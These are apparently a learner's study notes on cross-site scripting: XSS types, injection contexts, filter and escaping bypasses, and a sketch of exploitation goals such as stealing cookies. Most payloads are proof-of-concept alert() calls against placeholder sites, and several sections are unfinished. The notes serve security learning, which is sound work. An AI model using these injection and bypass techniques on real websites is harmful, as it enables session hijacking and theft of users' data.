# Cross-site scripting (XSS)

## General info
Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users

## Alert() limitation
TO DO

## Do not use alert(1)
```
<textarea id="script" onchange=("unsafe(this.value)"></textarea><br>
<iframe id="result" sandbox="allow-scripts allow-modals"></iframe>
```
```
document.session = "secret"
function unsafe(t) {
  var i = document.getElementById('result'); // get the <iframe>
  i.srcdoc = "<body><script>document.write("+t+");<"+"/script><body>";
}
```
- Try `alert(1)` and you see it works... but
- `alert(document.session)` won't work... why?
- `alert(window.origin)` or `alert(document.domain)` and you'll see it's empty
  - this is because the sandboxed iframe also has a different origin. It's isolated from the website it is embedded into and you cannot steal the secret session.
- Use `alert(document.domain)` or `alert(window.origin)` instead 

## Types of XSS
- Reflected XSS, where the malicious script comes from the current HTTP request.
  - `https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`
- Stored XSS, where the malicious script comes from the website's database.
  - POST example: `comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E`
- DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
  - ```
    <script>
    function trackSearch(query) {
      document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
      trackSearch(query);
    }
    </script>
    ```
  - Get request `https://insecure-website.com/index?search="><script>alert(document.domain)<%2Fscript>`
  - Methodology
      1. Look for any script that has a sinks
      2. See if you can control the sink
      3. Exploit it 
  - Note: here there are some sources and sinks
    - https://github.com/wisec/domxsswiki/wiki
    - https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities
  - Note 2: DOM Invader (Burp Suite tool) is a browser-based tool that helps you test for DOM XSS vulnerabilities using a variety of sources and sinks. 

### DOM XSS - Sources and sinks in third-party dependencies
To do...

### DOM XSS combined with reflected and stored data
- If a script reads some data from the URL and writes it to a dangerous sink, then the vulnerability is entirely client-side. (there is no processing from the server) 
- Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
  - `eval('var data = "reflected string"');`
- In a stored DOM XSS vulnerability, the server receives data from one request, stores it, and then includes the data in a later response. A script within the later response contains a sink which then processes the data in an unsafe way.
  - `element.innerHTML = comment.author`

## Cross-site scripting contexts
### XSS between HTML tags
```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```
- Bypass WAF
  - If you receive an error like "tag <img> is not allowed" or "event is not allowed", use XSS cheat sheet to discover a tag and event that work.
  - Note: understand how a payload works
    - `<body onresize="print()">` with this payload (for reflected XSS) you need an exploit server and iframe tag
### XSS in HTML tag attributes
- When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one.
  - `"><script>alert(document.domain)</script>`
- More commonly in this situation, angle brackets are blocked or encoded. In this case you can introduce a new attribute that creates a scriptable context.
  - `" autofocus onfocus=alert(document.domain) x="`
- Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context.
  - If the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script
    - `<a href="javascript:alert(document.domain)">`
- Access keys allow you to provide keyboard shortcuts that reference a specific element. This is useful in:
  - Hidden inputs because events like onmouseover and onfocus can't be triggered due to the element being invisible
    - `<input type="hidden" accesskey="X" onclick="alert(1)">`
  - `<link rel="canonical" accesskey="X" onclick="alert(1)" />`
- Suggestions:
  - Substitute `'` `"` and viceversa
  - Space is not needed
    - `<link rel="canonical" href='https://website.net/?'accesskey='X'onclick='alert(1)'/>`

### XSS into JavaScript
- Terminating the existing script (I don't really know why this works but it works)
  - The browser incorrectly interprets the `</script>` sequence within the string as the end of the script block, prematurely stopping the execution of your JavaScript script and generating an error.
      - ```
        <script>
        ...
        var input = 'controllable data here';
        ...
        </script>
        ```
        ```
        </script><img src=1 onerror=alert(document.domain)>
        ```
- Breaking out of a JavaScript string
  - It's essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing
    - ```
      '-alert(document.domain)-'
      ';alert(document.domain)//
      ```
  - Some applications try to escape single quote characters with a backslash but often forget to escape the backslash itself.
    - ` ';alert(document.domain)// ` is converted to `\';alert(document.domain)//` so your input could be `\';alert(document.domain)//` which gets converted to `\\';alert(document.domain)//`
  - Making use of HTML-encoding
    - When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around input filters.
      - `<a href="#" onclick="... var input='controllable data here'; ...">`
      - `&apos;-alert(document.domain)-&apos;`
      - The browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted
      - HTML encode: https://html.spec.whatwg.org/multipage/named-characters.html
      - Note: you cannot use `&quot;` -> `"` to close onclick attribute. Remember: The browser HTML-decode the value of the onlick attribute but not the entire structure
  - XSS in JavaScript template literals
    - JavaScript template literals are string literals that allow embedded JavaScript expressions (Template literals are encapsulated in backticks)
      - ```
        <script>
        ...
        var input = `controllable data here`;
        ...
        </script>
        ```
        ```
        ${alert(document.domain)}
        ```
### XSS via client-side template injection
To do
        
## Exploiting cross-site scripting vulnerabilities
### Exploiting cross-site scripting to steal cookies
- Send the victim's cookies to your own domain
- Limitation:
  - The victim might not be logged in.
  - Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
  - Sessions might be locked to additional factors like the user's IP address.
  - The session might time out before you're able to hijack it.
### Exploiting cross-site scripting to capture passwords
To do
### Exploiting cross-site scripting to perform CSRF
To do
